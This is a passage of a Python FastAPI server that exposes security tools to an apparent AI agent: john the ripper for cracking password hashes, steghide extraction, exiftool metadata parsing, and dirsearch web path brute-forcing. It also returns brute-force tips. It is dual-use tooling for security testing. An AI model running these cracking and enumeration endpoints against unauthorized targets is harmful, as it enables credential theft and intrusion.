        rules = params.get("rules")
        show = params.get("show", False)

        if not hash_file and not show:
            return ToolResponse(
                tool="john_the_ripper", status="error", error="Hash file is required"
            )

        # Build john command
        if show:
            command = ["john", "--show"]
            if hash_file:
                command.append(hash_file)
        else:
            command = ["john", f"--wordlist={wordlist}"]

            if format_type:
                command.append(f"--format={format_type}")

            if rules:
                command.append(f"--rules={rules}")

            command.append(hash_file)

        logger.info(f"Executing john command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=300,  # 5 minutes
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse results
        cracked_passwords = []
        if show or "password" in stdout.lower():
            for line in stdout.split("\n"):
                if ":" in line and not line.startswith("Loaded"):
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        cracked_passwords.append(
                            {
                                "user_or_hash": parts[0].strip(),
                                "password": parts[1].strip(),
                            }
                        )

        return ToolResponse(
            tool="john_the_ripper",
            status="success",
            result={
                "raw_output": stdout,
                "cracked_passwords": cracked_passwords,
                "summary": f"Cracked {len(cracked_passwords)} passwords",
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "hash_file": hash_file,
                "wordlist": wordlist,
            },
        )

    except Exception as e:
        logger.error(f"Error in john_the_ripper: {e}")
        return ToolResponse(tool="john_the_ripper", status="error", error=str(e))


@app.post("/tools/steghide", response_model=ToolResponse)
async def steghide(request: ToolRequest):
    """Extract hidden data from images using steghide."""
    try:
        params = request.parameters
        image_file = params.get("image_file")
        passphrase = params.get("passphrase", "")
        info = params.get("info", False)

        if not image_file:
            return ToolResponse(
                tool="steghide", status="error", error="Image file is required"
            )

        # Build steghide command
        if info:
            command = ["steghide", "info", image_file]
        else:
            command = ["steghide", "extract", "-sf", image_file]

        # Add passphrase if provided
        if passphrase:
            command.extend(["-p", passphrase])
        else:
            command.extend(["-p", ""])  # Empty passphrase

        logger.info(f"Executing steghide command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=60
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Check for extracted file
        extracted_file = None
        if "extracted" in stdout.lower():
            for line in stdout.split("\n"):
                if "wrote extracted data" in line.lower():
                    parts = line.split('"')
                    if len(parts) >= 2:
                        extracted_file = parts[1]

        return ToolResponse(
            tool="steghide",
            status="success" if returncode == 0 else "failed",
            result={
                "raw_output": stdout + stderr,
                "extracted_file": extracted_file,
                "command": " ".join(command),
                "tips": [
                    "Try common passphrases: empty, 'password', 'steghide', etc.",
                    "Use steghide info to check if data is embedded",
                    "For brute force: stegcracker <file> <wordlist>",
                ],
            },
            metadata={
                "execution_time": execution_time,
                "image_file": image_file,
            },
        )

    except Exception as e:
        logger.error(f"Error in steghide: {e}")
        return ToolResponse(tool="steghide", status="error", error=str(e))


@app.post("/tools/exiftool", response_model=ToolResponse)
async def exiftool(request: ToolRequest):
    """Extract metadata from files using exiftool."""
    try:
        params = request.parameters
        file_path = params.get("file_path")

        if not file_path:
            return ToolResponse(
                tool="exiftool", status="error", error="File path is required"
            )

        # Build exiftool command
        command = ["exiftool", file_path]

        logger.info(f"Executing exiftool command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=60
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse metadata
        metadata = {}
        for line in stdout.split("\n"):
            if ":" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    key = parts[0].strip()
                    value = parts[1].strip()
                    metadata[key] = value

        # Look for interesting fields
        interesting_fields = {}
        keywords = [
            "comment",
            "description",
            "author",
            "creator",
            "copyright",
            "gps",
            "latitude",
            "longitude",
            "software",
            "model",
            "make",
        ]

        for key, value in metadata.items():
            if any(keyword in key.lower() for keyword in keywords):
                interesting_fields[key] = value

        return ToolResponse(
            tool="exiftool",
            status="success",
            result={
                "raw_output": stdout,
                "metadata": metadata,
                "interesting_fields": interesting_fields,
                "command": " ".join(command),
                "tips": [
                    "Look for hidden comments or descriptions",
                    "Check GPS coordinates if present",
                    "Examine software/creator info for clues",
                    "Try: exiftool -b -ThumbnailImage file.jpg > thumb.jpg",
                ],
            },
            metadata={
                "execution_time": execution_time,
                "file_path": file_path,
                "total_fields": len(metadata),
            },
        )

    except Exception as e:
        logger.error(f"Error in exiftool: {e}")
        return ToolResponse(tool="exiftool", status="error", error=str(e))


@app.post("/tools/dirsearch", response_model=ToolResponse)
async def dirsearch(request: ToolRequest):
    """Execute dirsearch for directory and file discovery."""
    try:
        params = request.parameters
        url = params.get("url")
        extensions = params.get("extensions", "php,html,js,txt")
        wordlist = params.get("wordlist")
        threads = params.get("threads", 20)
        recursive = params.get("recursive", False)

        if not url:
            return ToolResponse(
                tool="dirsearch", status="error", error="URL is required"
            )

        # Build dirsearch command
        command = ["dirsearch", "-u", url, "-e", extensions, "-t", str(threads)]

        if wordlist:
            command.extend(["-w", wordlist])

        if recursive:
            command.append("-r")

        # Output format
        command.extend(["--format", "json", "-q"])

        logger.info(f"Executing dirsearch command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=600,  # 10 minutes
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse results
        discovered_paths = []
        for line in stdout.split("\n"):
            if line.strip() and (
                "[" in line or "200" in line or "301" in line or "302" in line
            ):
                # Basic parsing for dirsearch output
                if "200" in line or "301" in line or "302" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        status_code = None
                        path = None
                        for i, part in enumerate(parts):
                            if part in ["200", "301", "302", "401", "403"]:
                                status_code = part
                                if i + 1 < len(parts):
                                    path = parts[i + 1]
                                break

                        if status_code and path:
                            discovered_paths.append(
                                {
                                    "status": status_code,
                                    "path": path,
                                    "url": f"{url.rstrip('/')}/{path.lstrip('/')}",
                                }
                            )

        return ToolResponse(
            tool="dirsearch",
            status="success",
            result={
                "raw_output": stdout,
                "discovered_paths": discovered_paths[:100],  # Limit to first 100
                "summary": f"Found {len(discovered_paths)} paths",
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "url": url,
                "extensions": extensions,
            },
        )

    except Exception as e:
        logger.error(f"Error in dirsearch: {e}")
        return ToolResponse(tool="dirsearch", status="error", error=str(e))


if __name__ == "__main__":
    port = int(os.getenv("MCP_PORT", "50051"))
    uvicorn.run(app, host="0.0.0.0", port=port)
